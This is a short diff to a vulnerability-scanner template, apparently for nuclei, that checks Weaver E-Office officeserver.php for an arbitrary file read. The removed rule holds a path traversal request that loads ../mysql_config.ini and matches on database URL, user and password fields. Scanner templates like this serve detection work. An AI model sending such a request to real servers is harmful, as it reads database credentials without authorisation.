@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: e-cology-e-office-officeserver-file-read
 
 info:
@@ -9,11 +10,3 @@ info:
     app="泛微-EOffice"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
-    expression: response.status == 200 && response.body.bcontains(b'dataurl') && response.body.bcontains(b'datauser') && response.body.bcontains(b'datapassword') && response.body.bcontains(b'dataname')
-expression: r0()
